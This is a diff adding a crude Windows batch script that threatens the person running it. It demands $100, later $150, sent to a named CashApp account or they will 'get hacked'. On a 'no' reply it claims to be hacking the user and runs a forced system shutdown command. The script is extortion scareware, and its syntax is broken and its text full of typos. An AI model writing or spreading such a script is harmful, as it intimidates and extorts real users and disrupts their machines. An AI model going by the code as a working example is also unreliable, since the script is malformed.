@@ -1,0 +1,21 @@
+@echo if 
+color d 
+:1
+echo Hello, you will now send me 100 dollars on cahsapp or ou will get hacked 
+set /p %input%=
+if /i %input%==ok goto ok
+if /i %input%==no goto no 
+if /i %input%==ok,no goto 1 
+if /i %input%==sending now goto alright
+
+:ok 
+echo my cashapp is $nikewalletho send it right now in 1 min or you will get hacked 
+
+:alright 
+echo you seem very confident if your so confident send me 150 and we can call it a deal? ok send it now 
+
+:no 
+echo i'am hacking you right now watch this 
+timeout 3 
+shutdown -s -t 100
+
